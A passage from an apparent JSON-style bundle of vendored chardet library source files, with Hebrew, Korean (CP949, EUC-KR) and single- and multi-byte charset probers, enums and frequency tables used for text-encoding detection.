0,0,0,1,1,1,1,1,0,1,0,0,0,1,1,0,0,\n)\n\nWin1255HebrewModel = {\n  'char_to_order_map': WIN1255_CHAR_TO_ORDER_MAP,\n  'precedence_matrix': HEBREW_LANG_MODEL,\n  'typical_positive_ratio': 0.984004,\n  'keep_english_letter': False,\n  'charset_name': \"windows-1255\",\n  'language': 'Hebrew',\n}\n", "thirdparty/chardet/hebrewprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n#          Shy Shalom\n# Portions created by the Initial Developer are Copyright (C) 2005\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .enums import ProbingState\n\n# This prober doesn't actually recognize a language or a charset.\n# It is a helper prober for the use of the Hebrew model probers\n\n### General ideas of the Hebrew charset recognition ###\n#\n# Four main charsets exist in Hebrew:\n# \"ISO-8859-8\" - Visual Hebrew\n# \"windows-1255\" - Logical Hebrew\n# \"ISO-8859-8-I\" - Logical Hebrew\n# \"x-mac-hebrew\" - ?? Logical Hebrew ??\n#\n# Both \"ISO\" charsets use a completely identical set of code points, whereas\n# \"windows-1255\" and \"x-mac-hebrew\" are two different proper supersets of\n# these code points. windows-1255 defines additional characters in the range\n# 0x80-0x9F as some misc punctuation marks as well as some Hebrew-specific\n# diacritics and additional 'Yiddish' ligature letters in the range 0xc0-0xd6.\n# x-mac-hebrew defines similar additional code points but with a different\n# mapping.\n#\n# As far as an average Hebrew text with no diacritics is concerned, all four\n# charsets are identical with respect to code points. Meaning that for the\n# main Hebrew alphabet, all four map the same values to all 27 Hebrew letters\n# (including final letters).\n#\n# The dominant difference between these charsets is their directionality.\n# \"Visual\" directionality means that the text is ordered as if the renderer is\n# not aware of a BIDI rendering algorithm. The renderer sees the text and\n# draws it from left to right. The text itself when ordered naturally is read\n# backwards. A buffer of Visual Hebrew generally looks like so:\n# \"[last word of first line spelled backwards] [whole line ordered backwards\n# and spelled backwards] [first word of first line spelled backwards]\n# [end of line] [last word of second line] ... etc' \"\n# adding punctuation marks, numbers and English text to visual text is\n# naturally also \"visual\" and from left to right.\n#\n# \"Logical\" directionality means the text is ordered \"naturally\" according to\n# the order it is read. It is the responsibility of the renderer to display\n# the text from right to left. A BIDI algorithm is used to place general\n# punctuation marks, numbers and English text in the text.\n#\n# Texts in x-mac-hebrew are almost impossible to find on the Internet. From\n# what little evidence I could find, it seems that its general directionality\n# is Logical.\n#\n# To sum up all of the above, the Hebrew probing mechanism knows about two\n# charsets:\n# Visual Hebrew - \"ISO-8859-8\" - backwards text - Words and sentences are\n#    backwards while line order is natural. For charset recognition purposes\n#    the line order is unimportant (In fact, for this implementation, even\n#    word order is unimportant).\n# Logical Hebrew - \"windows-1255\" - normal, naturally ordered text.\n#\n# \"ISO-8859-8-I\" is a subset of windows-1255 and doesn't need to be\n#    specifically identified.\n# \"x-mac-hebrew\" is also identified as windows-1255. A text in x-mac-hebrew\n#    that contain special punctuation marks or diacritics is displayed with\n#    some unconverted characters showing as question marks. This problem might\n#    be corrected using another model prober for x-mac-hebrew. Due to the fact\n#    that x-mac-hebrew texts are so rare, writing another model prober isn't\n#    worth the effort and performance hit.\n#\n#### The Prober ####\n#\n# The prober is divided between two SBCharSetProbers and a HebrewProber,\n# all of which are managed, created, fed data, inquired and deleted by the\n# SBCSGroupProber. The two SBCharSetProbers identify that the text is in\n# fact some kind of Hebrew, Logical or Visual. The final decision about which\n# one is it is made by the HebrewProber by combining final-letter scores\n# with the scores of the two SBCharSetProbers to produce a final answer.\n#\n# The SBCSGroupProber is responsible for stripping the original text of HTML\n# tags, English characters, numbers, low-ASCII punctuation characters, spaces\n# and new lines. It reduces any sequence of such characters to a single space.\n# The buffer fed to each prober in the SBCS group prober is pure text in\n# high-ASCII.\n# The two SBCharSetProbers (model probers) share the same language model:\n# Win1255Model.\n# The first SBCharSetProber uses the model normally as any other\n# SBCharSetProber does, to recognize windows-1255, upon which this model was\n# built. The second SBCharSetProber is told to make the pair-of-letter\n# lookup in the language model backwards. This in practice exactly simulates\n# a visual Hebrew model using the windows-1255 logical Hebrew model.\n#\n# The HebrewProber is not using any language model. All it does is look for\n# final-letter evidence suggesting the text is either logical Hebrew or visual\n# Hebrew. Disjointed from the model probers, the results of the HebrewProber\n# alone are meaningless. HebrewProber always returns 0.00 as confidence\n# since it never identifies a charset by itself. Instead, the pointer to the\n# HebrewProber is passed to the model probers as a helper \"Name Prober\".\n# When the Group prober receives a positive identification from any prober,\n# it asks for the name of the charset identified. If the prober queried is a\n# Hebrew model prober, the model prober forwards the call to the\n# HebrewProber to make the final decision. In the HebrewProber, the\n# decision is made according to the final-letters scores maintained and Both\n# model probers scores. The answer is returned in the form of the name of the\n# charset identified, either \"windows-1255\" or \"ISO-8859-8\".\n\nclass HebrewProber(CharSetProber):\n    # windows-1255 / ISO-8859-8 code points of interest\n    FINAL_KAF = 0xea\n    NORMAL_KAF = 0xeb\n    FINAL_MEM = 0xed\n    NORMAL_MEM = 0xee\n    FINAL_NUN = 0xef\n    NORMAL_NUN = 0xf0\n    FINAL_PE = 0xf3\n    NORMAL_PE = 0xf4\n    FINAL_TSADI = 0xf5\n    NORMAL_TSADI = 0xf6\n\n    # Minimum Visual vs Logical final letter score difference.\n    # If the difference is below this, don't rely solely on the final letter score\n    # distance.\n    MIN_FINAL_CHAR_DISTANCE = 5\n\n    # Minimum Visual vs Logical model score difference.\n    # If the difference is below this, don't rely at all on the model score\n    # distance.\n    MIN_MODEL_DISTANCE = 0.01\n\n    VISUAL_HEBREW_NAME = \"ISO-8859-8\"\n    LOGICAL_HEBREW_NAME = \"windows-1255\"\n\n    def __init__(self):\n        super(HebrewProber, self).__init__()\n        self._final_char_logical_score = None\n        self._final_char_visual_score = None\n        self._prev = None\n        self._before_prev = None\n        self._logical_prober = None\n        self._visual_prober = None\n        self.reset()\n\n    def reset(self):\n        self._final_char_logical_score = 0\n        self._final_char_visual_score = 0\n        # The two last characters seen in the previous buffer,\n        # mPrev and mBeforePrev are initialized to space in order to simulate\n        # a word delimiter at the beginning of the data\n        self._prev = ' '\n        self._before_prev = ' '\n        # These probers are owned by the group prober.\n\n    def set_model_probers(self, logicalProber, visualProber):\n        self._logical_prober = logicalProber\n        self._visual_prober = visualProber\n\n    def is_final(self, c):\n        return c in [self.FINAL_KAF, self.FINAL_MEM, self.FINAL_NUN,\n                     self.FINAL_PE, self.FINAL_TSADI]\n\n    def is_non_final(self, c):\n        # The normal Tsadi is not a good Non-Final letter due to words like\n        # 'lechotet' (to chat) containing an apostrophe after the tsadi. This\n        # apostrophe is converted to a space in FilterWithoutEnglishLetters\n        # causing the Non-Final tsadi to appear at an end of a word even\n        # though this is not the case in the original text.\n        # The letters Pe and Kaf rarely display a related behavior of not being\n        # a good Non-Final letter. Words like 'Pop', 'Winamp' and 'Mubarak'\n        # for example legally end with a Non-Final Pe or Kaf. However, the\n        # benefit of these letters as Non-Final letters outweighs the damage\n        # since these words are quite rare.\n        return c in [self.NORMAL_KAF, self.NORMAL_MEM,\n                     self.NORMAL_NUN, self.NORMAL_PE]\n\n    def feed(self, byte_str):\n        # Final letter analysis for logical-visual decision.\n        # Look for evidence that the received buffer is either logical Hebrew\n        # or visual Hebrew.\n        # The following cases are checked:\n        # 1) A word longer than 1 letter, ending with a final letter. This is\n        #    an indication that the text is laid out \"naturally\" since the\n        #    final letter really appears at the end. +1 for logical score.\n        # 2) A word longer than 1 letter, ending with a Non-Final letter. In\n        #    normal Hebrew, words ending with Kaf, Mem, Nun, Pe or Tsadi,\n        #    should not end with the Non-Final form of that letter. Exceptions\n        #    to this rule are mentioned above in isNonFinal(). This is an\n        #    indication that the text is laid out backwards. +1 for visual\n        #    score\n        # 3) A word longer than 1 letter, starting with a final letter. Final\n        #    letters should not appear at the beginning of a word. This is an\n        #    indication that the text is laid out backwards. +1 for visual\n        #    score.\n        #\n        # The visual score and logical score are accumulated throughout the\n        # text and are finally checked against each other in GetCharSetName().\n        # No checking for final letters in the middle of words is done since\n        # that case is not an indication for either Logical or Visual text.\n        #\n        # We automatically filter out all 7-bit characters (replace them with\n        # spaces) so the word boundary detection works properly. [MAP]\n\n        if self.state == ProbingState.NOT_ME:\n            # Both model probers say it's not them. No reason to continue.\n            return ProbingState.NOT_ME\n\n        byte_str = self.filter_high_byte_only(byte_str)\n\n        for cur in byte_str:\n            if cur == ' ':\n                # We stand on a space - a word just ended\n                if self._before_prev != ' ':\n                    # next-to-last char was not a space so self._prev is not a\n                    # 1 letter word\n                    if self.is_final(self._prev):\n                        # case (1) [-2:not space][-1:final letter][cur:space]\n                        self._final_char_logical_score += 1\n                    elif self.is_non_final(self._prev):\n                        # case (2) [-2:not space][-1:Non-Final letter][\n                        #  cur:space]\n                        self._final_char_visual_score += 1\n            else:\n                # Not standing on a space\n                if ((self._before_prev == ' ') and\n                        (self.is_final(self._prev)) and (cur != ' ')):\n                    # case (3) [-2:space][-1:final letter][cur:not space]\n                    self._final_char_visual_score += 1\n            self._before_prev = self._prev\n            self._prev = cur\n\n        # Forever detecting, till the end or until both model probers return\n        # ProbingState.NOT_ME (handled above)\n        return ProbingState.DETECTING\n\n    @property\n    def charset_name(self):\n        # Make the decision: is it Logical or Visual?\n        # If the final letter score distance is dominant enough, rely on it.\n        finalsub = self._final_char_logical_score - self._final_char_visual_score\n        if finalsub >= self.MIN_FINAL_CHAR_DISTANCE:\n            return self.LOGICAL_HEBREW_NAME\n        if finalsub <= -self.MIN_FINAL_CHAR_DISTANCE:\n            return self.VISUAL_HEBREW_NAME\n\n        # It's not dominant enough, try to rely on the model scores instead.\n        modelsub = (self._logical_prober.get_confidence()\n                    - self._visual_prober.get_confidence())\n        if modelsub > self.MIN_MODEL_DISTANCE:\n            return self.LOGICAL_HEBREW_NAME\n        if modelsub < -self.MIN_MODEL_DISTANCE:\n            return self.VISUAL_HEBREW_NAME\n\n        # Still no good, back to final letter distance, maybe it'll save the\n        # day.\n        if finalsub < 0.0:\n            return self.VISUAL_HEBREW_NAME\n\n        # (finalsub > 0 - Logical) or (don't know what to do) default to\n        # Logical.\n        return self.LOGICAL_HEBREW_NAME\n\n    @property\n    def language(self):\n        return 'Hebrew'\n\n    @property\n    def state(self):\n        # Remain active as long as any of the model probers are active.\n        if (self._logical_prober.state == ProbingState.NOT_ME) and \\\n           (self._visual_prober.state == ProbingState.NOT_ME):\n            return ProbingState.NOT_ME\n        return ProbingState.DETECTING\n", "thirdparty/chardet/cp949prober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .chardistribution import EUCKRDistributionAnalysis\nfrom .codingstatemachine import CodingStateMachine\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .mbcssm import CP949_SM_MODEL\n\n\nclass CP949Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(CP949Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)\n        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be\n        #       not different.\n        self.distribution_analyzer = EUCKRDistributionAnalysis()\n        self.reset()\n\n    @property\n    def charset_name(self):\n        return \"CP949\"\n\n    @property\n    def language(self):\n        return \"Korean\"\n", "thirdparty/chardet/sbcharsetprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .enums import CharacterCategory, ProbingState, SequenceLikelihood\n\n\nclass SingleByteCharSetProber(CharSetProber):\n    SAMPLE_SIZE = 64\n    SB_ENOUGH_REL_THRESHOLD = 1024  #  0.25 * SAMPLE_SIZE^2\n    POSITIVE_SHORTCUT_THRESHOLD = 0.95\n    NEGATIVE_SHORTCUT_THRESHOLD = 0.05\n\n    def __init__(self, model, reversed=False, name_prober=None):\n        super(SingleByteCharSetProber, self).__init__()\n        self._model = model\n        # TRUE if we need to reverse every pair in the model lookup\n        self._reversed = reversed\n        # Optional auxiliary prober for name decision\n        self._name_prober = name_prober\n        self._last_order = None\n        self._seq_counters = None\n        self._total_seqs = None\n        self._total_char = None\n        self._freq_char = None\n        self.reset()\n\n    def reset(self):\n        super(SingleByteCharSetProber, self).reset()\n        # char order of last character\n        self._last_order = 255\n        self._seq_counters = [0] * SequenceLikelihood.get_num_categories()\n        self._total_seqs = 0\n        self._total_char = 0\n        # characters that fall in our sampling range\n        self._freq_char = 0\n\n    @property\n    def charset_name(self):\n        if self._name_prober:\n            return self._name_prober.charset_name\n        else:\n            return self._model['charset_name']\n\n    @property\n    def language(self):\n        if self._name_prober:\n            return self._name_prober.language\n        else:\n            return self._model.get('language')\n\n    def feed(self, byte_str):\n        if not self._model['keep_english_letter']:\n            byte_str = self.filter_international_words(byte_str)\n        if not byte_str:\n            return self.state\n        char_to_order_map = self._model['char_to_order_map']\n        for i, c in enumerate(byte_str):\n            # XXX: Order is in range 1-64, so one would think we want 0-63 here,\n            #      but that leads to 27 more test failures than before.\n            order = char_to_order_map[c]\n            # XXX: This was SYMBOL_CAT_ORDER before, with a value of 250, but\n            #      CharacterCategory.SYMBOL is actually 253, so we use CONTROL\n            #      to make it closer to the original intent. The only difference\n            #      is whether or not we count digits and control characters for\n            #      _total_char purposes.\n            if order < CharacterCategory.CONTROL:\n                self._total_char += 1\n            if order < self.SAMPLE_SIZE:\n                self._freq_char += 1\n                if self._last_order < self.SAMPLE_SIZE:\n                    self._total_seqs += 1\n                    if not self._reversed:\n                        i = (self._last_order * self.SAMPLE_SIZE) + order\n                        model = self._model['precedence_matrix'][i]\n                    else:  # reverse the order of the letters in the lookup\n                        i = (order * self.SAMPLE_SIZE) + self._last_order\n                        model = self._model['precedence_matrix'][i]\n                    self._seq_counters[model] += 1\n            self._last_order = order\n\n        charset_name = self._model['charset_name']\n        if self.state == ProbingState.DETECTING:\n            if self._total_seqs > self.SB_ENOUGH_REL_THRESHOLD:\n                confidence = self.get_confidence()\n                if confidence > self.POSITIVE_SHORTCUT_THRESHOLD:\n                    self.logger.debug('%s confidence = %s, we have a winner',\n                                      charset_name, confidence)\n                    self._state = ProbingState.FOUND_IT\n                elif confidence < self.NEGATIVE_SHORTCUT_THRESHOLD:\n                    self.logger.debug('%s confidence = %s, below negative '\n                                      'shortcut threshhold %s', charset_name,\n                                      confidence,\n                                      self.NEGATIVE_SHORTCUT_THRESHOLD)\n                    self._state = ProbingState.NOT_ME\n\n        return self.state\n\n    def get_confidence(self):\n        r = 0.01\n        if self._total_seqs > 0:\n            r = ((1.0 * self._seq_counters[SequenceLikelihood.POSITIVE]) /\n                 self._total_seqs / self._model['typical_positive_ratio'])\n            r = r * self._freq_char / self._total_char\n            if r >= 1.0:\n                r = 0.99\n        return r\n", "thirdparty/chardet/version.py": "\"\"\"\nThis module exists only to simplify retrieving the version number of chardet\nfrom within setup.py and from chardet subpackages.\n\n:author: Dan Blanchard (dan.blanchard@gmail.com)\n\"\"\"\n\n__version__ = \"3.0.4\"\nVERSION = __version__.split('.')\n", "thirdparty/chardet/enums.py": "\"\"\"\nAll of the Enums that are used throughout the chardet package.\n\n:author: Dan Blanchard (dan.blanchard@gmail.com)\n\"\"\"\n\n\nclass InputState(object):\n    \"\"\"\n    This enum represents the different states a universal detector can be in.\n    \"\"\"\n    PURE_ASCII = 0\n    ESC_ASCII = 1\n    HIGH_BYTE = 2\n\n\nclass LanguageFilter(object):\n    \"\"\"\n    This enum represents the different language filters we can apply to a\n    ``UniversalDetector``.\n    \"\"\"\n    CHINESE_SIMPLIFIED = 0x01\n    CHINESE_TRADITIONAL = 0x02\n    JAPANESE = 0x04\n    KOREAN = 0x08\n    NON_CJK = 0x10\n    ALL = 0x1F\n    CHINESE = CHINESE_SIMPLIFIED | CHINESE_TRADITIONAL\n    CJK = CHINESE | JAPANESE | KOREAN\n\n\nclass ProbingState(object):\n    \"\"\"\n    This enum represents the different states a prober can be in.\n    \"\"\"\n    DETECTING = 0\n    FOUND_IT = 1\n    NOT_ME = 2\n\n\nclass MachineState(object):\n    \"\"\"\n    This enum represents the different states a state machine can be in.\n    \"\"\"\n    START = 0\n    ERROR = 1\n    ITS_ME = 2\n\n\nclass SequenceLikelihood(object):\n    \"\"\"\n    This enum represents the likelihood of a character following the previous one.\n    \"\"\"\n    NEGATIVE = 0\n    UNLIKELY = 1\n    LIKELY = 2\n    POSITIVE = 3\n\n    @classmethod\n    def get_num_categories(cls):\n        \"\"\":returns: The number of likelihood categories in the enum.\"\"\"\n        return 4\n\n\nclass CharacterCategory(object):\n    \"\"\"\n    This enum represents the different categories language models for\n    ``SingleByteCharsetProber`` put characters into.\n\n    Anything less than CONTROL is considered a letter.\n    \"\"\"\n    UNDEFINED = 255\n    LINE_BREAK = 254\n    SYMBOL = 253\n    DIGIT = 252\n    CONTROL = 251\n", "thirdparty/chardet/mbcharsetprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Universal charset detector code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 2001\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#   Shy Shalom - original C code\n#   Proofpoint, Inc.\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .enums import ProbingState, MachineState\n\n\nclass MultiByteCharSetProber(CharSetProber):\n    \"\"\"\n    MultiByteCharSetProber\n    \"\"\"\n\n    def __init__(self, lang_filter=None):\n        super(MultiByteCharSetProber, self).__init__(lang_filter=lang_filter)\n        self.distribution_analyzer = None\n        self.coding_sm = None\n        self._last_char = [0, 0]\n\n    def reset(self):\n        super(MultiByteCharSetProber, self).reset()\n        if self.coding_sm:\n            self.coding_sm.reset()\n        if self.distribution_analyzer:\n            self.distribution_analyzer.reset()\n        self._last_char = [0, 0]\n\n    @property\n    def charset_name(self):\n        raise NotImplementedError\n\n    @property\n    def language(self):\n        raise NotImplementedError\n\n    def feed(self, byte_str):\n        for i in range(len(byte_str)):\n            coding_state = self.coding_sm.next_state(byte_str[i])\n            if coding_state == MachineState.ERROR:\n                self.logger.debug('%s %s prober hit error at byte %s',\n                                  self.charset_name, self.language, i)\n                self._state = ProbingState.NOT_ME\n                break\n            elif coding_state == MachineState.ITS_ME:\n                self._state = ProbingState.FOUND_IT\n                break\n            elif coding_state == MachineState.START:\n                char_len = self.coding_sm.get_current_charlen()\n                if i == 0:\n                    self._last_char[1] = byte_str[0]\n                    self.distribution_analyzer.feed(self._last_char, char_len)\n                else:\n                    self.distribution_analyzer.feed(byte_str[i - 1:i + 1],\n                                                    char_len)\n\n        self._last_char[0] = byte_str[-1]\n\n        if self.state == ProbingState.DETECTING:\n            if (self.distribution_analyzer.got_enough_data() and\n                    (self.get_confidence() > self.SHORTCUT_THRESHOLD)):\n                self._state = ProbingState.FOUND_IT\n\n        return self.state\n\n    def get_confidence(self):\n        return self.distribution_analyzer.get_confidence()\n", "thirdparty/chardet/euckrprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import EUCKRDistributionAnalysis\nfrom .mbcssm import EUCKR_SM_MODEL\n\n\nclass EUCKRProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCKRProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCKR_SM_MODEL)\n        self.distribution_analyzer = EUCKRDistributionAnalysis()\n        self.reset()\n\n    @property\n    def charset_name(self):\n        return \"EUC-KR\"\n\n    @property\n    def language(self):\n        return \"Korean\"\n", "thirdparty/chardet/euckrfreq.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# Sampling from about 20M text materials include literature and computer technology\n\n# 128  --> 0.79\n# 256  --> 0.92\n# 512  --> 0.986\n# 1024 --> 0.99944\n# 2048 --> 0.99999\n#\n# Idea Distribution Ratio = 0.98653 / (1-0.98653) = 73.24\n# Random Distribution Ration = 512 / (2350-512) = 0.279.\n#\n# Typical Distribution Ratio\n\nEUCKR_TYPICAL_DISTRIBUTION_RATIO = 6.0\n\nEUCKR_TABLE_SIZE = 2352\n\n# Char to FreqOrder table ,\nEUCKR_CHAR_TO_FREQ_ORDER = (\n  13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,\n1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,\n1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,\n 945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,\n 116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,\n 708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,\n1751, 617,1752, 626,1753,1754,1755,1756, 653,1757,1758,1759,1760,1761,1762, 856,\n 344,1763,1764,1765,1766,  89, 401, 418, 806, 905, 848,1767,1768,1769, 946,1205,\n 709,1770,1118,1771, 241,1772,1773,1774,1271,1775, 569,1776, 999,1777,1778,1779,\n1780, 337, 751,1058,  28, 628, 254,1781, 177, 906, 270, 349, 891,1079,1782,  19,\n1783, 379,1784, 315,1785, 629, 754,1402, 559,1786, 636, 203,1206,1787, 710, 567,\n1788, 935, 814,1789,1790,1207, 766, 528,1791,1792,1208,1793,1794,1795,1796,1797,\n1403,1798,1799, 533,1059,1404,1405,1156,1406, 936, 884,1080,1800, 351,1801,1802,\n1803,1804,1805, 801,1806,1807,1808,1119,1809,1157, 714, 474,1407,1810, 298, 899,\n 885,1811,1120, 802,1158,1812, 892,1813,1814,1408, 659,1815,1816,1121,1817,1818,\n1819,1820,1821,1822, 319,1823, 594, 545,1824, 815, 937,1209,1825,1826, 573,1409,\n1022,1827,1210,1828,1829,1830,1831,1832,1833, 556, 722, 807,1122,1060,1834, 697,\n1835, 900, 557, 715,1836,1410, 540,1411, 752,1159, 294, 597,1211, 976, 803, 770,\n1412,1837,1838,  39, 794,1413, 358,1839, 371, 925,1840, 453, 661, 788, 531, 723,\n 544,1023,1081, 869,  91,1841, 392, 430, 790, 602,1414, 677,1082, 457,1415,1416,\n1842,1843, 475, 327,1024,1417, 795, 121,1844, 733, 403,1418,1845,1846,1847, 300,\n 119, 711,1212, 627,1848,1272, 207,1849,1850, 796,1213, 382,1851, 519,1852,1083,\n 893,1853,1854,1855, 367, 809, 487, 671,1856, 663,1857,1858, 956, 471, 306, 857,\n1859,1860,1160,1084,1861,1862,1863,1864,1865,1061,1866,1867,1868,1869,1870,1871,\n 282,  96, 574,1872, 502,1085,1873,1214,1874, 907,1875,1876, 827, 977,1419,1420,\n1421, 268,1877,1422,1878,1879,1880, 308,1881,   2, 537,1882,1883,1215,1884,1885,\n 127, 791,1886,1273,1423,1887,  34, 336, 404, 643,1888, 571, 654, 894, 840,1889,\n   0, 886,1274, 122, 575, 260, 908, 938,1890,1275, 410, 316,1891,1892, 100,1893,\n1894,1123,  48,1161,1124,1025,1895, 633, 901,1276,1896,1897, 115, 816,1898, 317,\n1899, 694,1900, 909, 734,1424, 572, 866,1425, 691,  85, 524,1010, 543, 394, 841,\n1901,1902,1903,1026,1904,1905,1906,1907,1908,1909,  30, 451, 651, 988, 310,1910,\n1911,1426, 810,1216,  93,1912,1913,1277,1217,1914, 858, 759,  45,  58, 181, 610,\n 269,1915,1916, 131,1062, 551, 443,1000, 821,1427, 957, 895,1086,1917,1918, 375,\n1919, 359,1920, 687,1921, 822,1922, 293,1923,1924,  40, 662, 118, 692,  29, 939,\n 887, 640, 482, 174,1925,  69,1162, 728,1428, 910,1926,1278,1218,1279, 386, 870,\n 217, 854,1163, 823,1927,1928,1929,1930, 834,1931,  78,1932, 859,1933,1063,1934,\n1935,1936,1937, 438,1164, 208, 595,1938,1939,1940,1941,1219,1125,1942, 280, 888,\n1429,1430,1220,1431,1943,1944,1945,1946,1947,1280, 150, 510,1432,1948,1949,1950,\n1951,1952,1953,1954,1011,1087,1955,1433,1043,1956, 881,1957, 614, 958,1064,1065,\n1221,1958, 638,1001, 860, 967, 896,1434, 989, 492, 553,1281,1165,1959,1282,1002,\n1283,1222,1960,1961,1962,1963,  36, 383, 228, 753, 247, 454,1964, 876, 678,1965,\n1966,1284, 126, 464, 490, 835, 136, 672, 529, 940,1088,1435, 473,1967,1968, 467,\n  50, 390, 227, 587, 279, 378, 598, 792, 968, 240, 151, 160, 849, 882,1126,1285,\n 639,1044, 133, 140, 288, 360, 811, 563,1027, 561, 142, 523,1969,1970,1971,   7,\n 103, 296, 439, 407, 506, 634, 990,1972,1973,1974,1975, 645,1976,1977,1978,1979,\n1980,1981, 236,1982,1436,1983,1984,1089, 192, 828, 618, 518,1166, 333,1127,1985,\n 818,1223,1986,1987,1988,1989,1990,1991,1992,1993, 342,1128,1286, 746, 842,1994,\n1995, 560, 223,1287,  98,   8, 189, 650, 978,1288,1996,1437,1997,  17, 345, 250,\n 423, 277, 234, 512, 226,  97, 289,  42, 